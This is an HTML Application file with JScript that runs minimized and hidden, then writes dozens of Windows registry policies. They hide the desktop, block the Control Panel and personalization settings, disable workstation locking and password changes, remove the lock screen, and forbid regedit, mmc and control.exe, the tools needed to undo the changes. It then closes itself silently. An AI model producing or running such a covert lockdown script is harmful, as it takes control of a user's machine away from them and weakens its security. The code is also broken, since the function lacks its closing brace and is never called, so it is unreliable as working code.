<html>
<head>
    <title></title>
    <HTA:APPLICATION
      ID="oHTA"
      APPLICATIONNAME="HiddenApp"
      WINDOWSTATE="minimize"
      SHOWINTASKBAR="no"
      CAPTION="no"
      BORDER="none"
      SYSMENU="no"
      MAXIMIZEBUTTON="no"
      MINIMIZEBUTTON="no"
   >

    <script language="JScript">
        function setReg(path, type, value) {
            var shell = new ActiveXObject("WScript.Shell");
            shell.RegWrite(path, value, type);
        }
        
        function applyPolicies() {

            var ad = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop\\";
            setReg(ad+"NoChangingWallPaper", "REG_DWORD", 1);
            setReg(ad+"NoAddingComponents", "REG_DWORD", 1);
            setReg(ad+"NoDeletingComponents", "REG_DWORD", 1);
            setReg(ad+"NoComponents", "REG_DWORD", 1);
        
            var ex = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\";
            setReg(ex+"NoDriveTypeAutoRun", "REG_DWORD", 91);
            setReg(ex+"NoActiveDesktopChanges", "REG_DWORD", 1);
            setReg(ex+"NoThemesTab", "REG_DWORD", 1);
            setReg(ex+"NoSimpleStartMenu", "REG_DWORD", 1);
            setReg(ex+"NoSearchInternetInStartMenu", "REG_DWORD", 1);
            setReg(ex+"ForceRunOnStartMenu", "REG_DWORD", 1);
            setReg(ex+"NoDesktop", "REG_DWORD", 1);
            setReg(ex+"NoControlPanel", "REG_DWORD", 1);
        
            var pr = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Programs\\";
            setReg(pr+"NoGetPrograms", "REG_DWORD", 1);
            setReg(pr+"NoInstalledUpdates", "REG_DWORD", 1);
            setReg(pr+"NoWindowsMarketplace", "REG_DWORD", 1);
        
            var sys = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\";
            setReg(sys+"Wallpaper", "REG_SZ", "C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg");
        
            setReg("HKCU\\Control Panel\\Desktop\\TileWallpaper", "REG_SZ", "0");
            setReg("HKCU\\Control Panel\\Desktop\\WallpaperStyle", "REG_SZ", "2");
        
            setReg(sys+"NoColorChoice", "REG_DWORD", 1);
            setReg(sys+"NoVisualStyleChoice", "REG_DWORD", 1);
            setReg(sys+"NoDispBackgroundPage", "REG_DWORD", 1);
            setReg(sys+"NoDispAppearancePage", "REG_DWORD", 1);
            setReg(sys+"NoDispSettingsPage", "REG_DWORD", 1);
            setReg(sys+"NoDispScrSavPage", "REG_DWORD", 1);
            setReg(sys+"NoSizeChoice", "REG_DWORD", 1);
            setReg(sys+"DisableLockWorkstation", "REG_DWORD", 1);
            setReg(sys+"DisableChangePassword", "REG_DWORD", 1);

            setReg("HKCU\\Software\\Policies\\Microsoft\\Windows\\Explorer\\NoPinningToTaskbar", "REG_DWORD", 1);
        
            var persCU = "HKCU\\Software\\Policies\\Microsoft\\Windows\\Personalization\\";
            setReg(persCU+"NoChangingMousePointers", "REG_DWORD", 1);
            setReg(persCU+"NoChangingTheme", "REG_DWORD", 1);
            setReg(persCU+"NoChangingColorScheme", "REG_DWORD", 1);
            setReg(persCU+"NoChangingStartMenuBackground", "REG_DWORD", 1);
        
            // HKLM Policies (requires admin)
            var persLM = "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Personalization\\";
            setReg(persLM+"NoChangingLockScreen", "REG_DWORD", 1);
            setReg(persLM+"NoLockScreen", "REG_DWORD", 1);
        
            setReg("HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer\\HideRecentlyAddedApps", "REG_DWORD", 1);
        
            // DisallowRun
            var dr = ex + "DisallowRun\\";
            setReg(dr+"1", "REG_SZ", "mmc.exe");
            setReg(dr+"2", "REG_SZ", "regedit.exe");
            setReg(dr+"3", "REG_SZ", "control.exe");

            // Close HTA after 3 seconds
            setTimeout(function(){ window.close(); }, 3000);
    </script>
</head>

</html>
